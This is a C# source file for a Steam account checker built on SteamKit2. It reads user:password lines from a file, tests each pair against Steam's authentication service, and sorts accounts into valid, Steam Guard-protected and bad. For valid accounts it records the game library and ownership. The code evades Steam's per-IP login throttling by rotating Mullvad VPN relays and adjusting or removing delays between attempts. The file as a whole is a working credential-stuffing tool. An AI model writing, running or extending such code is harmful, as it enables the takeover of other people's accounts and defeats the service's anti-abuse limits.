using SAC.HelperClasses;
using SteamKit2;
using SteamKit2.Authentication;
using SteamKit2.Internal;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SAC
{
    class AccountChecker
    {
        // Steam answers the authentication request quickly when it is not throttling us.
        // The timeouts are short on purpose: a silent Steam is a throttled Steam, and
        // waiting half a minute per attempt only makes the run look frozen.
        private static readonly TimeSpan ConnectTimeout = TimeSpan.FromSeconds(10);
        private static readonly TimeSpan AuthTimeout = TimeSpan.FromSeconds(15);
        private static readonly TimeSpan LogonTimeout = TimeSpan.FromSeconds(10);
        // one ownership ticket per selected game; Steam answers these in well under a second
        private static readonly TimeSpan TicketTimeout = TimeSpan.FromSeconds(5);
        private static readonly TimeSpan LogOffTimeout = TimeSpan.FromSeconds(4);

        // How often a silent wait says that it is still running.
        private static readonly TimeSpan SlowAnswerNotice = TimeSpan.FromSeconds(10);

        // A dropped request is not a wrong password: retry it, and only write the
        // account off after every attempt has been throttled. The pause grows with
        // every attempt (5s, 10s) instead of a flat 20s.
        private const int MaxAttempts = 3;
        private static readonly TimeSpan RetryBackoff = TimeSpan.FromSeconds(5);

        // The pause between accounts is not a workaround for the SteamKit version:
        // Steam throttles the login endpoint per IP, so a fixed pause either wastes
        // time or fails to protect a long run. Start at the floor and grow only when
        // Steam actually pushes back. Ultra mode removes the floor completely.
        private static readonly TimeSpan NormalMinDelay = TimeSpan.FromMilliseconds(150);
        private static TimeSpan MinDelay =>
            Settings.ultraMode ? TimeSpan.Zero : NormalMinDelay;
        private static readonly TimeSpan MaxDelay = TimeSpan.FromSeconds(30);
        private static TimeSpan betweenAccountsDelay = NormalMinDelay;

        // How many times one account may trigger a relay swap. Steam answers a
        // clean address on the first try, so more than a couple only means the
        // block covers a whole range and the run should not keep burning time.
        private const int MaxIpSwitches = 2;

        // The "Mullvad CLI is missing" note is worth printing once, not per account.
        private static bool warnedNoMullvad;

        // betweenAccountsDelay is shared by every wait in the run, so one push-back
        // from Steam slows the whole check down instead of being forgotten.
        private static readonly object delayLock = new object();

        // Set from the UI thread. Every wait and every retry loop consults it, so a
        // stop takes effect in the middle of an account instead of after the run.
        private static volatile bool stopRequested;

        public static bool StopRequested => stopRequested;

        public static void RequestStop() => stopRequested = true;

        private enum Outcome
        {
            Resolved,
            Retry,
        }

        private sealed class GuardRequiredException : Exception
        {
            public GuardRequiredException(string message) : base(message) { }
        }

        // These generated accounts either have no Steam Guard at all, or we have no way
        // to receive their code. Refusing the code request classifies them correctly.
        private sealed class NoCodeAuthenticator : IAuthenticator
        {
            public Task<string> GetEmailCodeAsync(string email, bool previousCodeWasIncorrect)
                => Task.FromException<string>(new GuardRequiredException("Steam Guard email code required"));

            public Task<string> GetDeviceCodeAsync(bool previousCodeWasIncorrect)
                => Task.FromException<string>(new GuardRequiredException("Steam Guard device code required"));

            public Task<bool> AcceptDeviceConfirmationAsync()
                => Task.FromException<bool>(new GuardRequiredException("Steam Guard mobile confirmation required"));
        }

        // SteamKit only delivers callbacks while RunWaitCallbacks is being pumped,
        // so every wait has to pump instead of blocking on the task alone.
        private static bool PumpUntil(CallbackManager manager, Func<bool> condition, TimeSpan timeout)
        {
            DateTime start = DateTime.UtcNow;
            DateTime deadline = start + timeout;
            DateTime nextNotice = start + SlowAnswerNotice;

            while (!condition() && DateTime.UtcNow < deadline && !stopRequested)
            {
                try { manager.RunWaitCallbacks(TimeSpan.FromMilliseconds(100)); }
                catch { break; }

                // A silent Steam looks like a frozen program: say that it is still
                // being waited on instead of leaving the last message on screen.
                if (DateTime.UtcNow >= nextNotice)
                {
                    LogHelper.Log($"⏳ Waiting for Steam... {(DateTime.UtcNow - start).TotalSeconds:0}s");
                    nextNotice = nextNotice.Add(SlowAnswerNotice);
                }
            }

            return condition();
        }

        // Sleeps in small slices so pressing Stop does not have to wait out a pause
        // (the back-off between retries can be up to 20 seconds).
        private static bool Pause(TimeSpan duration)
        {
            DateTime deadline = DateTime.UtcNow + duration;

            while (DateTime.UtcNow < deadline && !stopRequested)
            {
                double left = (deadline - DateTime.UtcNow).TotalMilliseconds;

                if (left <= 0)
                    break;

                Thread.Sleep((int)Math.Min(200, left));
            }

            return !stopRequested;
        }

        private static bool IsGuardResult(EResult result)
        {
            return result == EResult.AccountLogonDenied
                || result == EResult.AccountLoginDeniedNeedTwoFactor
                || result == EResult.AccountLogonDeniedNoMail
                || result == EResult.AccountLogonDeniedVerifiedEmailRequired
                || result == EResult.InvalidLoginAuthCode
                || result == EResult.TwoFactorCodeMismatch;
        }

        private static bool IsRetryableResult(EResult result)
        {
            return result == EResult.RateLimitExceeded
                || result == EResult.AccountLoginDeniedThrottle
                || result == EResult.Busy
                || result == EResult.TryAnotherCM
                || result == EResult.ServiceUnavailable
                || result == EResult.Timeout
                || result == EResult.Pending
                || result == EResult.NoConnection
                || result == EResult.RemoteCallFailed;
        }

        // Verifies the credentials through Steam's modern authentication service —
        // the same one the official client uses. Steam's legacy SteamUser.LogOn
        // password path rejects valid credentials with InvalidPassword, which is why
        // this must not fall back to it.
        // Steam issues an app ownership ticket to the account that is allowed to run the
        // game. Unlike GetOwnedGames it also answers "yes" for a game borrowed through
        // Family Sharing, which is the only way to see SCP on such accounts.
        private static Dictionary<uint, bool?> CheckOwnership(
            SteamClient client,
            CallbackManager manager,
            string user,
            string refreshToken,
            IList<uint> appIds)
        {
            Dictionary<uint, bool?> results = new Dictionary<uint, bool?>();

            if (appIds == null || appIds.Count == 0)
                return results;

            try
            {
                SteamUser.LoggedOnCallback logon = null;
                var logonSubscription = manager.Subscribe<SteamUser.LoggedOnCallback>(callback => logon = callback);

                client.GetHandler<SteamUser>().LogOn(new SteamUser.LogOnDetails
                {
                    Username = user,
                    AccessToken = refreshToken,
                });

                bool loggedOn = PumpUntil(manager, () => logon != null, LogonTimeout);
                logonSubscription.Dispose();

                if (!loggedOn || logon == null || logon.Result != EResult.OK)
                {
                    foreach (uint appId in appIds)
                        results[appId] = null;

                    return results;
                }

                SteamApps apps = client.GetHandler<SteamApps>();

                foreach (uint appId in appIds)
                {
                    try
                    {
                        Task<SteamApps.AppOwnershipTicketCallback> ticket =
                            apps.GetAppOwnershipTicket(appId).ToTask();

                        if (!PumpUntil(manager, () => ticket.IsCompleted, TicketTimeout) || !ticket.IsCompleted)
                        {
                            results[appId] = null;
                            continue;
                        }

                        results[appId] = ticket.GetAwaiter().GetResult().Result == EResult.OK;
                    }
                    catch
                    {
                        results[appId] = null;
                    }
                }
            }
            catch
            {
                // ownership is extra information — it must never fail a valid account
                foreach (uint appId in appIds)
                {
                    if (!results.ContainsKey(appId))
                        results[appId] = null;
                }
            }

            return results;
        }

        // One live CM connection per worker thread: the handshake costs ~0.5-1s and
        // only the credentials change between accounts. Every worker owns its client,
        // so accounts can be checked at the same time without sharing state.
        private sealed class Session : IDisposable
        {
            private SteamClient client;
            private CallbackManager manager;
            private bool connected;

            public bool EnsureConnection()
            {
                if (client != null && connected)
                    return true;

                CloseConnection();

                SteamClient fresh = new SteamClient();
                CallbackManager freshManager = new CallbackManager(fresh);
                bool gotConnected = false;

                freshManager.Subscribe<SteamClient.ConnectedCallback>(callback => gotConnected = true);
                freshManager.Subscribe<SteamClient.DisconnectedCallback>(callback => connected = false);

                try { fresh.Connect(); }
                catch { return false; }

                client = fresh;
                manager = freshManager;

                if (!PumpUntil(manager, () => gotConnected, ConnectTimeout) || !gotConnected)
                {
                    CloseConnection();
                    return false;
                }

                connected = true;
                return true;
            }

            public void CloseConnection()
            {
                try { client?.Disconnect(); } catch { /* already gone */ }

                client = null;
                manager = null;
                connected = false;
            }

            public void Dispose() => CloseConnection();

            // The client is logged on only while the ownership tickets are requested.
            // Leaving it logged on would block the next account's authentication.
            private void LogOffIfNeeded()
            {
                if (client == null || manager == null)
                    return;

                try
                {
                    bool loggedOff = false;

                    using (manager.Subscribe<SteamUser.LoggedOffCallback>(callback => loggedOff = true))
                    {
                        client.GetHandler<SteamUser>()?.LogOff();
                        PumpUntil(manager, () => loggedOff || !connected, LogOffTimeout);
                    }
                }
                catch
                {
                    // the connection is reused only while it answers
                }
            }

            public (Outcome outcome, string reason) TryAccountOnce(string user, string pass)
            {
                if (!EnsureConnection())
                    return (Outcome.Retry, "connection timed out");

            try
            {
                AuthSessionDetails details = new AuthSessionDetails
                {
                    Username = user,
                    Password = pass,
                    DeviceFriendlyName = "SAC Account Checker",
                    PlatformType = EAuthTokenPlatformType.k_EAuthTokenPlatformType_SteamClient,
                    IsPersistentSession = false,
                    Authenticator = new NoCodeAuthenticator(),
                };

                CredentialsAuthSession session;
                AuthPollResult result;

                try
                {
                    Task<CredentialsAuthSession> beginTask =
                        client.Authentication.BeginAuthSessionViaCredentialsAsync(details);

                    if (!PumpUntil(manager, () => beginTask.IsCompleted, AuthTimeout))
                        return (Outcome.Retry, "Steam did not answer in time");

                    session = beginTask.GetAwaiter().GetResult();

                    // If the wait times out, the polling loop would otherwise keep
                    // asking Steam in the background for the rest of the run.
                    using (CancellationTokenSource pollCancel = new CancellationTokenSource())
                    {
                        Task<AuthPollResult> pollTask = session.PollingWaitForResultAsync(pollCancel.Token);

                        if (!PumpUntil(manager, () => pollTask.IsCompleted, AuthTimeout))
                        {
                            pollCancel.Cancel();
                            return (Outcome.Retry, "Steam did not answer in time");
                        }

                        result = pollTask.GetAwaiter().GetResult();
                    }
                }
                catch (GuardRequiredException ex)
                {
                    SteamAccountHelper.RecordSteamGuard(user, pass, ex.Message);
                    return (Outcome.Resolved, null);
                }
                catch (AuthenticationException ex)
                {
                    if (IsGuardResult(ex.Result))
                    {
                        SteamAccountHelper.RecordSteamGuard(user, pass, $"Steam Guard required ({ex.Result})");
                        return (Outcome.Resolved, null);
                    }

                    if (IsRetryableResult(ex.Result))
                        return (Outcome.Retry, ex.Result.ToString());

                    SteamAccountHelper.RecordBad(user, pass, ex.Result.ToString());
                    return (Outcome.Resolved, null);
                }
                catch (OperationCanceledException)
                {
                    return (Outcome.Retry, "Steam did not answer in time");
                }
                catch (Exception ex)
                {
                    // a transport hiccup must not turn a working account into a "bad" one
                    return (Outcome.Retry, ex.GetType().Name + ": " + ex.Message);
                }

                if (string.IsNullOrEmpty(result?.RefreshToken))
                    return (Outcome.Retry, "Steam returned no session token");

                // Stop pressed while Steam was answering: do not spend a round trip on
                // the library or count this account as decided.
                if (stopRequested)
                    return (Outcome.Retry, "stopped");

                // the credentials are proven correct — that is what the checker reports
                ulong steamId = session.SteamID?.ConvertToUInt64() ?? 0;

                // Fetch the library now, while the owner's token is still fresh, so the
                // game filter can be used both during and after the run.
                GameLibrary games = GameLibraryHelper.Fetch(result.AccessToken, steamId);

                // Games the library does not list may still be playable through Family
                // Sharing, and only an ownership ticket can prove that. Asking for every
                // game would waste a round trip per account, so only the missing ones
                // are checked.
                List<uint> missing = new List<uint>();

                foreach (GameFilter.GameOption game in SteamAccountHelper.Filter.SelectedGames())
                {
                    if (games == null || !games.Loaded || !games.Owns(game.AppId))
                        missing.Add(game.AppId);
                }

                Dictionary<uint, bool?> ticketAccess =
                    CheckOwnership(client, manager, user, result.RefreshToken, missing);

                SteamAccountHelper.RecordSuccess(user, pass, steamId, games, ticketAccess);
                return (Outcome.Resolved, null);
            }
            finally
            {
                LogOffIfNeeded();
            }
            }
        }

        // Returns true when Steam pushed back (the account needed a retry or was
        // throttled), so the caller can widen the pause before the next account.
        // With allowIpSwitch set, a throttle or a timeout swaps the Mullvad relay
        // and gives the account its attempts back on the new address.
        private static bool RunOneAccount(Session session, string user, string pass, bool allowIpSwitch = false)
        {
            bool resolved = false;
            bool pushedBack = false;
            string lastReason = "no answer from Steam";
            Stopwatch watch = Stopwatch.StartNew();
            int ipSwitches = 0;

            for (int attempt = 1; attempt <= MaxAttempts && !resolved && !stopRequested; attempt++)
            {
                if (attempt > 1)
                    LogHelper.Log($"🔍 '{user}' — attempt {attempt}/{MaxAttempts}");

                (Outcome outcome, string reason) = session.TryAccountOnce(user, pass);

                resolved = outcome == Outcome.Resolved;

                // Stop pressed while this account was being checked: it was not
                // decided one way or the other, so it must not be written off as bad
                // or counted as checked.
                if (!resolved && stopRequested)
                    return pushedBack;

                if (resolved)
                    break;

                pushedBack = true;

                if (!string.IsNullOrEmpty(reason))
                    lastReason = reason;

                // Steam throttles the whole IP, not one account. A fresh relay is
                // worth more than any retry on the blocked address, so the account
                // simply starts over there.
                if (allowIpSwitch && Settings.autoSwitchIp && ipSwitches < MaxIpSwitches
                    && LooksLikeIpProblem(reason) && SwitchIp(session))
                {
                    ipSwitches++;
                    attempt = 0; // the attempts restart on the new address
                    watch.Restart();
                    ResetDelay();
                    continue;
                }

                if (attempt < MaxAttempts)
                {
                    LogHelper.Log($"↻ '{user}' — {reason}, retry {attempt}/{MaxAttempts - 1} ({watch.Elapsed.TotalSeconds:0}s)");

                    if (!Pause(TimeSpan.FromTicks(RetryBackoff.Ticks * attempt)))
                        return pushedBack;
                }
            }

            if (!resolved && !stopRequested)
            {
                // After every attempt Steam still did not let the account in: record
                // it as a failure so every line of the file shows up in the list
                // instead of silently disappearing.
                LogHelper.Log($"⏱ '{user}' — {lastReason}\n");
                SteamAccountHelper.RecordBad(user, pass, $"No answer: {lastReason}");
            }

            // exactly one row and one counter step per account
            {
                int done = Interlocked.Increment(ref SteamAccountHelper.checkedAccounts);
                int left = Math.Max(0, SteamAccountHelper.maximumData - done);

                SteamAccountHelper.remainingAccounts = left;
                UIHelper.UpdateRemainingLabel(left.ToString());
                UIHelper.UpdateCheckedLabel(done.ToString());
            }

            return pushedBack;
        }

        // "Too many logins from this IP", a silent Steam and a dropped connection all
        // point at the address instead of the account, so those are the answers that
        // make a new Mullvad relay worth trying.
        private static bool LooksLikeIpProblem(string reason)
        {
            if (string.IsNullOrEmpty(reason))
                return false;

            return reason.IndexOf("Throttle", StringComparison.OrdinalIgnoreCase) >= 0
                || reason.IndexOf("RateLimit", StringComparison.OrdinalIgnoreCase) >= 0
                || reason.IndexOf("timed out", StringComparison.OrdinalIgnoreCase) >= 0
                || reason.IndexOf("did not answer", StringComparison.OrdinalIgnoreCase) >= 0;
        }

        // Swaps the Mullvad relay and reopens the connection on the new address.
        // Returns true only when the tunnel is back up, so the caller can tell a
        // real switch from a failed one.
        private static bool SwitchIp(Session session)
        {
            if (!MullvadHelper.IsInstalled)
            {
                if (!warnedNoMullvad)
                {
                    warnedNoMullvad = true;
                    LogHelper.Log("⚠ Mullvad app not found — cannot switch IP automatically. Retrying on the same address.");
                }

                return false;
            }

            LogHelper.Log("🌐 Steam is throttling this IP — switching the Mullvad relay...");

            // The open connection belongs to the blocked address; let it go so the
            // next attempt dials Steam through the new relay.
            session.CloseConnection();

            if (!MullvadHelper.Rotate(TimeSpan.FromSeconds(60)))
            {
                LogHelper.Log("⚠ Could not switch the Mullvad relay — continuing on the same IP.");
                return false;
            }

            string state = MullvadHelper.TunnelState();
            LogHelper.Log($"🌐 New Mullvad relay is up ({state ?? "connected"}) — retrying.\n");
            return true;
        }

        // A successful relay swap starts the run over at the floor, which is zero
        // in ultra mode.
        private static void ResetDelay()
        {
            lock (delayLock)
                betweenAccountsDelay = MinDelay;
        }

        // Healthy answers pull the pause back to the floor; one push-back doubles it.
        private static void AdaptDelay(bool pushedBack)
        {
            lock (delayLock)
            {
                double ms = betweenAccountsDelay.TotalMilliseconds;

                if (pushedBack)
                {
                    double next = Math.Min(MaxDelay.TotalMilliseconds, ms * 2);

                    if (next > ms)
                        LogHelper.Log($"🐢 Steam is throttling — pause between accounts now {next / 1000:0.#}s");

                    betweenAccountsDelay = TimeSpan.FromMilliseconds(next);
                }
                else if (ms > MinDelay.TotalMilliseconds)
                {
                    betweenAccountsDelay = TimeSpan.FromMilliseconds(Math.Max(MinDelay.TotalMilliseconds, ms * 0.75));
                }
            }
        }

        private static TimeSpan CurrentDelay()
        {
            lock (delayLock)
                return betweenAccountsDelay;
        }

        public static void CheckManually()
        {
            stopRequested = false;
            LogHelper.Log("⌛ Starting manual check...");
            SteamAccountHelper.maximumData = 1;
            SteamAccountHelper.remainingAccounts = 1;
            SteamAccountHelper.checkedAccounts = 0;
            UIHelper.UpdateRemainingLabel("1");

            using (Session session = new Session())
                RunOneAccount(session, Program.mw.textBox1.Text, Program.mw.textBox2.Text);
        }

        public static void CheckAutomatically()
        {
            stopRequested = false;
            SteamAccountHelper.filePath = Program.mw.textBoxFile.Text;

            // parse robustly: each line is user:password; ignore empty lines
            List<string[]> entries = new List<string[]>();
            foreach (string line in SteamAccountHelper.fileContent.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries))
            {
                string l = line.Trim();
                if (l.Length == 0) continue;
                int sep = l.IndexOf(':');
                if (sep > 0 && sep < l.Length - 1)
                    entries.Add(new[] { l.Substring(0, sep), l.Substring(sep + 1) });
            }

            SteamAccountHelper.maximumData = entries.Count;
            SteamAccountHelper.remainingAccounts = entries.Count;
            SteamAccountHelper.checkedAccounts = 0;

            lock (delayLock)
                betweenAccountsDelay = MinDelay;

            UIHelper.UpdateRemainingLabel(SteamAccountHelper.remainingAccounts.ToString());
            UIHelper.UpdateCheckedLabel("0");

            if (entries.Count == 0)
                return;

            // With auto IP switch on, the run should not start on the address Steam
            // has already blocked: bring the tunnel up first (and say so when the
            // Mullvad app is missing, because then nothing will be switched later).
            if (Settings.autoSwitchIp)
            {
                if (!MullvadHelper.IsInstalled)
                {
                    LogHelper.Log("⚠ Mullvad app not found — the check will run on the current IP without switching.");
                }
                else
                {
                    LogHelper.Log("🌐 Making sure the Mullvad tunnel is up...");

                    if (MullvadHelper.EnsureConnected(TimeSpan.FromSeconds(60)))
                        LogHelper.Log("🌐 Mullvad connected — the check will switch relays when Steam throttles.");
                    else
                        LogHelper.Log("⚠ Mullvad did not come up — the check continues on the current IP.");
                }

                if (stopRequested)
                    return;
            }

            // One account at a time, in file order. Steam limits logins per IP, and
            // a single stream with an adaptive pause is what stayed reliable on the
            // big files: the connection is kept open between accounts, so the only
            // cost per account is the authentication itself.
            try
            {
                using (Session session = new Session())
                {
                    for (int index = 0; index < entries.Count; index++)
                    {
                        if (stopRequested)
                            break;

                        string[] entry = entries[index];

                        try
                        {
                            LogHelper.Log($"🔍 {index + 1}/{entries.Count} — '{entry[0]}'");

                            bool pushedBack = RunOneAccount(session, entry[0], entry[1], allowIpSwitch: true);
                            AdaptDelay(pushedBack);

                            if (index + 1 < entries.Count && !Pause(CurrentDelay()))
                                break;
                        }
                        catch (Exception ex)
                        {
                            // a single broken account must not abort the whole run
                            LogHelper.Log($"⚠ '{entry[0]}' — {ex.Message}\n");
                        }
                    }
                }
            }
            finally
            {
                int checkedNow = Volatile.Read(ref SteamAccountHelper.checkedAccounts);

                if (stopRequested)
                {
                    LogHelper.Log($"⏹ Stopped by user — {checkedNow}/{entries.Count} accounts checked\n");
                }
                else if (checkedNow < entries.Count)
                {
                    LogHelper.Log($"⚠ {entries.Count - checkedNow} account(s) were left unchecked — Steam did not answer. Run the file again later.\n");
                }
            }
        }


        public static void CleanupUpdate() // Cleans up any left-overs from the last session to avoid conflict and errors
        {
            SteamAccountHelper.userName = string.Empty;
            SteamAccountHelper.password = string.Empty;
            SteamAccountHelper.localToExport = string.Empty;
            SteamAccountHelper.checkedAccounts = 0;
            SteamAccountHelper.remainingAccounts = 0;
            SteamAccountHelper.maximumData = 0;
            SteamAccountHelper.currentValue = 0;
            SteamAccountHelper.loggableAccounts = 0;
            SteamAccountHelper.steamGuardProtectedAccounts = 0;
            SteamAccountHelper.badAccounts = 0;
            SteamAccountHelper.vacBannedAccounts = 0;

            LogHelper.LogClear();

            UIHelper.UpdateLoggableLabel(SteamAccountHelper.loggableAccounts.ToString());
            UIHelper.UpdateSGProjectedLabel(SteamAccountHelper.steamGuardProtectedAccounts.ToString());
            UIHelper.UpdateBadLabel(SteamAccountHelper.badAccounts.ToString());
            UIHelper.UpdateVacLabel(SteamAccountHelper.vacBannedAccounts.ToString());
        }

    }
}
